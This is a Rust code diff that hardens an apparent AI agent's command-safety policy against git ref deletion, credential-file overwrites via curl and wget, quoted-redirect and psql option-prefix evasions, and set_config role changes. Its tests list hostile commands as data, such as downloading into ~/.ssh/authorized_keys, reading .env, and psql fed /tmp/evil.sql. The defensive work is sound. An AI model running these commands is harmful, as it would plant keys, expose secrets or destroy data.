@@ -442,6 +442,11 @@ pub(super) fn is_destructive_vcs_action(command: &str, scratchpad_roots: &[Strin
         .iter()
         .map(|token| token.to_ascii_lowercase())
         .collect();
+    let short_cluster_has = |wanted: char| {
+        args.iter().any(|token| {
+            token.starts_with('-') && !token.starts_with("--") && token.contains(wanted)
+        })
+    };
     match action.as_str() {
         "push" => lower.iter().any(|token| {
             token == "-f"
@@ -503,21 +508,32 @@ pub(super) fn is_destructive_vcs_action(command: &str, scratchpad_roots: &[Strin
         "branch" => {
             // Forced branch deletion can discard unmerged commits; plain deletion
             // refuses unmerged branches and remains recoverable.
-            let short_cluster_has = |wanted: char| {
-                args.iter().any(|token| {
-                    token.starts_with('-') && !token.starts_with("--") && token.contains(wanted)
-                })
-            };
             // `-D` is a forced delete on its own, bundled (`-Dr`) or not.
             let force_deletes = short_cluster_has('D');
             let deletes = short_cluster_has('d') || lower.iter().any(|token| token == "--delete");
             let forces = short_cluster_has('f') || lower.iter().any(|token| token == "--force");
             force_deletes || (deletes && forces)
         }
-        // Deleting a ref is a force delete; `--stdin` input may carry deletes.
-        "update-ref" => lower
-            .iter()
-            .any(|token| matches!(token.as_str(), "-d" | "--stdin")),
+        // Deleting a ref is a force delete: `-d`, a zero or empty new value, or
+        // `--stdin` input that may carry either.
+        "update-ref" => {
+            let mut operands = Vec::new();
+            let mut skip_value = false;
+            for token in args {
+                if skip_value {
+                    skip_value = false;
+                } else if token == "-m" {
+                    skip_value = true;
+                } else if !token.starts_with('-') {
+                    operands.push(token.as_str());
+                }
+            }
+            let zeroes_ref = operands.get(1).is_some_and(|new_value| {
+                new_value.is_empty()
+                    || (new_value.len() >= 4 && new_value.chars().all(|c| c == '0'))
+            });
+            short_cluster_has('d') || lower.iter().any(|token| token == "--stdin") || zeroes_ref
+        }
         "stash" => lower
             .first()
             .is_some_and(|subcommand| matches!(subcommand.as_str(), "drop" | "clear")),
@@ -815,7 +831,8 @@ fn sensitive_file_access(
     sensitive_path: fn(&str) -> bool,
     skip_redirect_targets: bool,
 ) -> bool {
-    let Some(tokens) = sql_tokens(&collapse_whitespace(command)) else {
+    let collapsed = collapse_whitespace(command);
+    let Some(tokens) = sql_tokens(&collapsed) else {
         return false;
     };
     let Some(first) = tokens.first() else {
@@ -826,11 +843,19 @@ fn sensitive_file_access(
     if !(is_file_access_program(&program) || is_echo_write) {
         return false;
     }
-    let skip_redirect_targets = skip_redirect_targets && !is_echo_write;
+    // `sql_tokens` strips quotes; a quoted `'>'` is an operand, so operators
+    // are recognised on the raw words, which must line up with the tokens.
+    let chars: Vec<char> = collapsed.chars().collect();
+    let raw_words: Vec<String> = tokenize_quoted(&chars)
+        .into_iter()
+        .map(|word| word.text)
+        .collect();
+    let skip_redirect_targets =
+        skip_redirect_targets && !is_echo_write && raw_words.len() == tokens.len();
     let mut after_bare_operator = false;
-    for token in tokens.iter().skip(1) {
+    for (index, token) in tokens.iter().enumerate().skip(1) {
         let target = skip_redirect_targets
-            .then(|| redirect_out_target(token))
+            .then(|| redirect_out_target(&raw_words[index]))
             .flatten();
         let is_target = after_bare_operator || target.is_some_and(|target| !target.is_empty());
         after_bare_operator = target == Some("");
@@ -1181,6 +1206,16 @@ pub(super) fn network_outcome_in(command: &str, original: &str) -> Option<Outcom
             "<network: credential-file upload>",
         ));
     }
+    if matches!(program.as_str(), "curl" | "wget") {
+        let outputs = output_file_targets(&program, &tokens);
+        if outputs.iter().any(|path| sensitive_credential_path(path)) {
+            return Some(network_rule(
+                Verdict::Deny,
+                "<network: download into a credential file>",
+            ));
+        }
+        mutating |= outputs.iter().any(|path| project_secret_path(path, false));
+    }
     if is_elasticsearch_read_only_query(&elasticsearch_query_tokens(&raw_words, &tokens, original))
     {
         return None;
@@ -1392,6 +1427,46 @@ fn sql_invocation(command: &str) -> Option<SqlInvocation> {
 /// next token.
 const PSQL_VALUE_LETTERS: &str = "cdfFhLoPpRTUv";
 
+/// Every long option psql 16 accepts.
+const PSQL_LONG_OPTIONS: &[&str] = &[
+    "echo-all",
+    "no-align",
+    "command",
+    "dbname",
+    "echo-queries",
+    "echo-errors",
+    "echo-hidden",
+    "file",
+    "field-separator",
+    "host",
+    "html",
+    "list",
+    "log-file",
+    "no-readline",
+    "output",
+    "port",
+    "pset",
+    "quiet",
+    "record-separator",
+    "single-step",
+    "single-line",
+    "tuples-only",
+    "table-attr",
+    "username",
+    "set",
+    "variable",
+    "version",
+    "no-password",
+    "password",
+    "expanded",
+    "no-psqlrc",
+    "field-separator-zero",
+    "record-separator-zero",
+    "single-transaction",
+    "help",
+    "csv",
+];
+
 /// psql short options that take no value.
 const PSQL_PLAIN_LETTERS: &str = "aAbeEHlnqsStwWxXz01";
 
@@ -1451,17 +1526,38 @@ fn psql_invocation(tokens: &[String]) -> Option<SqlInvocation> {
                 Some((name, value)) => (name, Some(value)),
                 None => (long, None),
             };
-            match name {
-                "version" | "help" => informational = true,
-                "file" | "output" | "log-file" => return Some(SqlInvocation::Opaque),
-                "command" => match inline.or_else(|| tokens.get(i).map(String::as_str)) {
+            // getopt_long accepts any unambiguous prefix of a long option.
+            let candidates: Vec<&str> = PSQL_LONG_OPTIONS
+                .iter()
+                .copied()
+                .filter(|option| option.starts_with(name))
+                .collect();
+            let resolved = match candidates.as_slice() {
+                _ if candidates.contains(&name) => Some(name),
+                [only] => Some(*only),
+                _ => None,
+            };
+            match resolved {
+                Some("version" | "help") => informational = true,
+                Some("file" | "output" | "log-file") => return Some(SqlInvocation::Opaque),
+                Some("command") => match inline.or_else(|| tokens.get(i).map(String::as_str)) {
                     Some(statement) => {
                         items.push(statement.to_string());
                         i += usize::from(inline.is_none());
                     }
                     None => return Some(SqlInvocation::Opaque),
                 },
-                _ => {}
+                Some(_) => {}
+                // An ambiguous prefix is an error in psql; one that could be a
+                // file, output or command option is not worth reasoning about.
+                None => {
+                    if candidates
+                        .iter()
+                        .any(|option| matches!(*option, "file" | "output" | "log-file" | "command"))
+                    {
+                        return Some(SqlInvocation::Opaque);
+                    }
+                }
             }
             continue;
         }
@@ -1524,6 +1620,21 @@ pub(super) fn psql_heredoc_outcome(candidate: &str, original: &str) -> Option<Ou
         .into_iter()
         .find(|segment| segment.contains("<<"))?;
     if heredoc.expands || !matches!(sql_invocation(&opener)?, SqlInvocation::PsqlStdin) {
+        return None;
+    }
+    // The last stdin redirect wins in the shell: `<<` must be the only `<`.
+    let mut quote = None;
+    let mut input_operators = 0;
+    for c in opener.chars() {
+        match quote {
+            Some(q) if c == q => quote = None,
+            Some(_) => {}
+            None if matches!(c, '\'' | '"') => quote = Some(c),
+            None if c == '<' => input_operators += 1,
+            None => {}
+        }
+    }
+    if input_operators != 2 {
         return None;
     }
     let items = psql_script_items(&heredoc.body)?;
@@ -1700,6 +1811,10 @@ fn is_psql_meta_command_read_only(item: &str) -> bool {
 /// in `\gset`.
 fn is_psql_item_read_only(item: &str) -> bool {
     let item = item.trim();
+    // `set_config` changes the guarded settings behind `is_psql_session_setting`.
+    if item.to_ascii_lowercase().contains("set_config") {
+        return false;
+    }
     if item.starts_with('\\') {
         return is_psql_meta_command_read_only(item);
     }
@@ -2246,6 +2361,37 @@ mod tests {
     }
 
     #[test]
+    fn curl_and_wget_output_files_keep_credential_paths_protected() {
+        let policy = SafetyPolicy::default();
+        for command in [
+            "curl -D ~/.ssh/authorized_keys https://x.example/a",
+            "curl --dump-header ~/.ssh/authorized_keys https://x.example/a",
+            "curl -fsS -o ~/.ssh/authorized_keys https://x.example/a",
+            "curl -fsSo ~/.ssh/authorized_keys https://x.example/a",
+            "curl -so ~/.aws/credentials https://x.example/a",
+            "curl --output=~/.aws/credentials https://x.example/a",
+            "curl -c ~/.ssh/authorized_keys https://x.example/a",
+            "curl --cookie-jar ~/.ssh/authorized_keys https://x.example/a",
+            "wget -O ~/.ssh/authorized_keys https://x.example/a",
+            "wget --output-document=~/.ssh/authorized_keys https://x.example/a",
+            "wget -o ~/.ssh/authorized_keys https://x.example/a",
+            "wget -a ~/.aws/credentials https://x.example/a",
+            "wget --output-file=~/.ssh/authorized_keys https://x.example/a",
+        ] {
+            let outcome = evaluate(&policy, command, LaunchMode::Interactive);
+            assert_eq!(outcome.verdict, Verdict::Deny, "{command}: {outcome:?}");
+        }
+        for command in [
+            "curl -fsS -o out.json https://ziglang.org/download/index.json",
+            "curl -D h.txt https://x.example/a",
+            "wget -O out.tgz https://x.example/a",
+        ] {
+            let outcome = evaluate(&policy, command, LaunchMode::Interactive);
+            assert_eq!(outcome.verdict, Verdict::Allow, "{command}: {outcome:?}");
+        }
+    }
+
+    #[test]
     fn uploading_a_credential_file_is_denied_before_any_prompt() {
         let policy = SafetyPolicy::default();
         for command in [
@@ -2327,6 +2473,15 @@ mod tests {
             "cat < .env",
             "cp .env /tmp/x",
             "cat .env > /tmp/x",
+            // A quoted operator is an operand, not a redirect.
+            "cat '>' master.key",
+            "cat \">\" .env",
+            "cat '2>' .env",
+            "cat '&>' master.key",
+            "cat '>|' master.key",
+            "cat -- '>' master.key",
+            "cat x '>' master.key",
+            "sed -n '>' .env",
         ] {
             assert_eq!(verdict(command).verdict, Verdict::Ask, "{command}");
         }
@@ -2901,6 +3056,11 @@ mod tests {
                 "git update-ref -d refs/heads/x abc123",
                 "git update-ref --stdin",
                 "git update-ref --stdin -z",
+                "git update-ref -dm x refs/heads/x",
+                "git update-ref -m x -d refs/heads/x",
+                "git update-ref refs/heads/x 0000000000000000000000000000000000000000",
+                "git update-ref -m x refs/heads/x 0000",
+                "git update-ref refs/heads/x \"\"",
             ] {
                 let outcome = evaluate(&policy, command, mode);
                 assert_eq!(outcome.verdict, Verdict::Ask, "{mode:?}: {command}");
@@ -3179,10 +3339,46 @@ mod tests {
             "cat <<'SQL' | psql -d bench\nSELECT 1;\nSQL",
             "psql -d bench < x.sql",
             "psql -d bench <<'SQL'\nSELECT 1;\nSQL\npsql -d bench <<'SQL'\nDROP TABLE t;\nSQL",
+            // Another stdin redirect on the opener wins in the shell.
+            "psql <<'SQL' < /tmp/evil.sql\nselect 1;\nSQL",
+            "psql <<'SQL' </tmp/evil.sql\nselect 1;\nSQL",
+            "psql <<'SQL' 0< /tmp/evil.sql\nselect 1;\nSQL",
+            "psql <<'SQL' <&3\nselect 1;\nSQL",
+            "psql <<'SQL' <>/tmp/f\nselect 1;\nSQL",
+            "psql <<'SQL' < <(echo evil)\nselect 1;\nSQL",
+            "psql <<'SQL' <<< '\\! id'\nselect 1;\nSQL",
+            "psql < /tmp/evil.sql <<'SQL'\nselect 1;\nSQL",
         ] {
             let outcome = evaluate(&policy, command, LaunchMode::Interactive);
             assert_eq!(outcome.verdict, Verdict::Ask, "{command}: {outcome:?}");
         }
+    }
+
+    #[test]
+    fn psql_long_options_resolve_by_unique_prefix_like_getopt_long() {
+        for command in [
+            "psql --fi=/tmp/evil.sql -c 'select 1'",
+            "psql --fil /tmp/evil.sql -c 'select 1'",
+            "psql -c 'select 1' --comm 'delete from t'",
+            "psql -c 'select 1' --com 'delete from t'",
+            "psql -c 'select 1' --co 'delete from t'",
+            "psql --out=/tmp/x -c 'select 1'",
+            "psql --log-f=/tmp/x -c 'select 1'",
+            "psql --o=/tmp/x -c 'select 1'",
+            "psql --f=/tmp/x -c 'select 1'",
+        ] {
+            let outcome = sql_outcome(command).expect(command);
+            assert_eq!(outcome.verdict, Verdict::Ask, "{command}: {outcome:?}");
+        }
+        for command in [
+            "psql --no-psqlrc --tuples-only --host=x -c 'select 1'",
+            "psql --dbname db --user=x --comma 'select 1'",
+            "psql --quiet --expanded -c 'select 1'",
+        ] {
+            let outcome = sql_outcome(command).expect(command);
+            assert_eq!(outcome.verdict, Verdict::Allow, "{command}: {outcome:?}");
+        }
+        assert!(sql_outcome("psql --vers").is_none());
     }
 
     #[test]
@@ -3221,6 +3417,8 @@ mod tests {
             "psql -Z -c 'select 1'",
             "psql -o /tmp/out -c 'select 1'",
             "psql -At",
+            "psql -c \"select set_config('role', 'postgres', false)\"",
+            "psql -c \"select pg_catalog.SET_CONFIG ('standard_conforming_strings', 'off', false)\"",
         ] {
             let outcome = sql_outcome(command).expect(command);
             assert_eq!(outcome.verdict, Verdict::Ask, "{command}: {outcome:?}");
